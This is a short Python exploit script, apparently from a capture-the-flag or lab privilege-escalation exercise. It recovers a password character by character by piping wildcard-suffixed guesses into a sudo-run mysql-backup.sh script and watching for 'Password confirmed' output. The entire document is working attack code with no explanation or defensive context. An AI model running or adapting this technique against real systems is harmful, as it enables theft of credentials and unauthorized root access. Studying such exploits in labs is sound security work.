import subprocess
import string


characters=string.ascii_letters+string.digits
password=""

while True:
    found_atleast_one = False
    for char in characters:
        cmd=f"echo '{password}{char}*' | sudo /opt/scripts/mysql-backup.sh"
        out=subprocess.run(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True).stdout
        if "Password confirmed" in out:
            password+=char
            print(password)
            found_atleast_one = True
            break
    if not found_atleast_one:
        print(f'The password is: {password}')
        break
